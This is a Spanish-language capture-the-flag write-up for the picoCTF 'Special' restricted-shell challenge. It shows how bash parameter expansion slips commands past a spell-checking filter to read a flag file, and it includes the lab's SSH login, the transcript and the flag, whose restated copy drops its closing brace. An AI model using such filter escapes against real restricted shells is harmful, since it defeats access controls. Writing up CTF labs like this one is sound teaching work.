## Descripción 
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.

Additional details will be available after launching your challenge instance.

`ssh -p 53960 ctf-player@saturn.picoctf.net`
The password is `d137d16e`
## Solución
 bueno en este caso todo comando que ingresemos se va a volver mayusculas, por lo cial no funcionara, por lo cual usaremos una forma especial de usar comando que en este caso sera por expancion, que lo que hace es asignarle a una vraiable ese valor, pero lo expande para ver su significado activando los comandos
 
 y se usa de la siguiente manera 
 
```bash
 ${name[@]}
```
donde name es el nombre de la variable y donde esta la @ ira los comando que pondremos 

por lo tanto nos ponemos buscar la flag


```
Special$ ${listar="ls -la"}      
${listar="ls -la"} 
total 0
drwxr-xr-x 1 ctf-player ctf-player 20 Sep 15 01:55 .
drwxr-xr-x 1 root       root       24 Mar 16  2023 ..
drwx------ 2 ctf-player ctf-player 34 Sep 15 01:55 .cache
drwxr-xr-x 2 ctf-player ctf-player 22 Mar 16  2023 blargh
Special$ ${listar="ls -la blargh"}
${listar="ls la blargh"} 
ls: cannot access 'la': No such file or directory
blargh:
flag.txt
Special$ ${listar="cat blargh/flag.txt"}
${listar="cat blargh/flag.txt"} 
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}
Special$ 
```

solucion:
```
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794
```
## Notas adicionales
cabe decir que los comando van entre comillas "comandos" ya que las comillas simples le quitan el significado, impidiendo la espansion
## Referencias

- https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html